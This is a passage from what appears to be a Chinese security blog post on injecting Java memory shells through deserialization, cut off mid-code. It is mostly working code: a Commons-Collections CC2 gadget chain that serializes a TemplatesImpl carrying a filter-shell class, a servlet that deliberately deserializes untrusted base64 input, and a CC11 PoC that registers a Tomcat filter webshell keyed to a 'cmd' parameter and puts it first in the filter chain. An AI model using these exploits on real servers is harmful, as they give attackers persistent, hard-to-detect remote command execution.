class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memoryshell.UnserShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransforme</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Sentiment&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class c=transformingComparator.getClass();</span><br><span class="line">        Field transformField=c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">In</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> In.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;FilterShell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Servlet端只需要一个接收参数base64解码并反序列化的接口，没有base64解码的接口可以用curl –data-binary注入二进制数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> memoryshell.UnserShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;exp&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试：</p><p>记得文件-&gt;项目结构-&gt;工件里面将依赖库导入WEB-INF&#x2F;lib</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154251902.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154251902.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230105154251902"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154418676.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154418676.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230105154418676"></p><h3 id="cc11"><a href="#cc11" class="headerlink" title="cc11"></a>cc11</h3><p>天下大木头师傅利用cc11注入的文章<a href="http://wjlshare.com/archives/1541%E9%87%8C%EF%BC%8C%E8%AF%A5POC%E5%AE%9E%E7%8E%B0%E4%BA%86spring%E7%8E%AF%E5%A2%83%E7%9A%84reqeust%E8%8E%B7%E5%8F%96">http://wjlshare.com/archives/1541里，该POC实现了spring环境的reqeust获取</a></p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatInject</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span> <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterUrlPattern</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;KpLi0rn&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">            <span class="keyword">if</span> (servletContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">ctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                ctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) ctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(appctx);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="comment">// 这样设置不会抛出报错</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class</span><br><span class="line">                            .getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                    stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Filter</span> <span class="variable">myFilter</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TomcatInject</span>();</span><br><span class="line">                    <span class="comment">// 调用 doFilter 来动态添加我们的 Filter</span></span><br><span class="line">                    <span class="comment">// 这里也可以利用反射来添加我们的 Filter</span></span><br><span class="line">                    javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span></span><br><span class="line">                            servletContext.addFilter(filterName,myFilter);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 进行一些简单的设置</span></span><br><span class="line">                    filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                    filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">                    <span class="comment">// 设置基本的 url pattern</span></span><br><span class="line">                    filterRegistration</span><br><span class="line">                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 将服务重新修改回来，不然的话服务会无法正常进行</span></span><br><span class="line">                    <span class="keyword">if</span> (stateField != <span class="literal">null</span>)&#123;</span><br><span class="line">                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 在设置之后我们需要 调用 filterstart</span></span><br><span class="line">                    <span class="keyword">if</span> (standardContext != <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="comment">// 设置filter之后调用 filterstart 来启动我们的 filter</span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> StandardContext.class.getDeclaredMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                        filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/**</span></span><br><span class="line"><span class="comment">                         * 将我们的 filtermap 插入到最前面</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line"></span><br><span class="line">                        <span class="type">Class</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ccc = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//把filter插到第一位</span></span><br><span class="line">                        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span><br><span class="line">                                .getDeclaredMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> <span class="title class_">Object</span>[filterMaps.length];</span><br><span class="line">                        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                            m = ccc.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) m.invoke(o);</span><br><span class="line">                            <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                                tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ServletContext <span class="title function_">getServletContext</span><span class="params">()</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">/*shell注入，前提需要能拿到request、response等*/</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ThreadLocal</span> <span class="variable">threadLocal</span> <span class="operator">=</span> (ThreadLocal) f.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//不为空则意味着第一次反序列化的准备工作已成功</span></span><br><span class="line">        <span class="keyword">if</span> (threadLocal != <span class="literal">null</span> &amp;&amp; threadLocal.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">            servletRequest = (ServletRequest) threadLocal.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果不能去到request，则换一种方式尝试获取</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//spring获取法1</span></span><br><span class="line">        <span class="keyword">if</span> (servletRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">                c = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">                m = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">                servletRequest = (ServletRequest) m.invoke(o);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletRequest != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> servletRequest.getServletContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//spring获取法2</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.ContextLoader&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getCurrentWebApplicationContext&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">            c = Class.forName(<span class="string">&quot;org.springframework.web.context.WebApplicationContext&quot;</span>);</span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getServletContext&quot;</span>);</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> (ServletContext) m.invoke(o);</span><br><span class="line">            <span class="keyword">return</span> servletContext;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest 